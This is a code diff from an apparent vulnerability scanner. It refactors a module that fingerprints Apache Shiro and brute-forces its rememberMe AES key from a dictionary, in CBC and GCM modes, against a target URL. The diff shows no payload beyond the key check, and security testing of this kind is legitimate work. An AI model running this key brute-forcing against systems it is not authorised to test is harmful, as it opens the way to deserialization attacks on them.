@@ -6,6 +6,9 @@ from Crypto.Cipher import AES
 
 from vulscan_Project import requestUtil
 from .. import fileUtil
+from ServiceScanModel.models import ServiceScan
+
+from ..requestClass import Requests
 
 
 class Poc(threading.Thread):
@@ -46,7 +49,6 @@ class Poc(threading.Thread):
             encrypt = getattr(self, self.mode + "_encrypt")
             self.cookies = "rememberMe=%s" % encrypt(self.key)
             resp = requestUtil.get(self.url, cookies=self.cookies)
-            print(resp.headers)
             if not "rememberme" in str(resp.headers).lower():
                 self.result = True
         except Exception as e:
@@ -56,40 +58,44 @@ class Poc(threading.Thread):
     def get_results(self):
         return self.result
 
+class POC:
+    def __init__(self, service: ServiceScan):
+        self.service = service
+        self.requestUtil= Requests(service.cookies)
+        self.result = False
 
-def fingerprint(service):
-    if service.url:
-        resp = requestUtil.get(service.url, cookies="rememberMe=1")
-        try:
-            if "rememberme" in str(resp.headers).lower():
-                return True
-        except Exception as e:
-            print(e)
-            return False
+    def fingerprint(self):
+        if self.service.url:
+            resp = requestUtil.get(self.service.url, cookies="rememberMe=1")
+            try:
+                if "rememberme" in str(resp.headers).lower():
+                    return True
+            except Exception as e:
+                print(e)
+                return False
 
 
-def poc(service):
-    key_file = fileUtil.open_file("dict_shiro/key.txt")
-    key_list = [k.strip() for k in key_file.readlines()]
+    def poc(self):
+        key_file = fileUtil.open_file("dict_shiro/key.txt")
+        key_list = [k.strip() for k in key_file.readlines()]
 
-    def test(mode):
-        shiro_list = []
-        for i in key_list:
-            key = i.strip()
-            shiro_list.append(Poc(key, service.url, mode))
-        for s in shiro_list:
-            s.start()
-        for s in shiro_list:
-            s.join()
-        for s in shiro_list:
-            r = s.get_results()
-            if s.get_results():
-                return ["shiro反序列化漏洞",
-                        "Cookie：rememberMe=%s...<br>Mode：%s<br>Key：%s" % (s.cookies.replace("rememberMe=", "")[:10], s.mode, s.key)]
-        return ["存在shiro框架", "Cookie：rememberMe=1", "success"]
+        def test(mode):
+            shiro_list = []
+            for i in key_list:
+                key = i.strip()
+                shiro_list.append(Poc(key, self.service.url, mode))
+            for s in shiro_list:
+                s.start()
+            for s in shiro_list:
+                s.join()
+            for s in shiro_list:
+                if s.get_results():
+                    return ["shiro反序列化漏洞",
+                            "Cookie：rememberMe=%s...<br>Mode：%s<br>Key：%s" % (s.cookies.replace("rememberMe=", "")[:10], s.mode, s.key)]
+            return ["存在shiro框架", "Cookie：rememberMe=1", "success"]
 
-    result_cbc = test("cbc")
-    if len(result_cbc) == 3:
-        return test("gcm")
-    else:
-        return result_cbc
+        result_cbc = test("cbc")
+        if len(result_cbc) == 3:
+            return test("gcm")
+        else:
+            return result_cbc
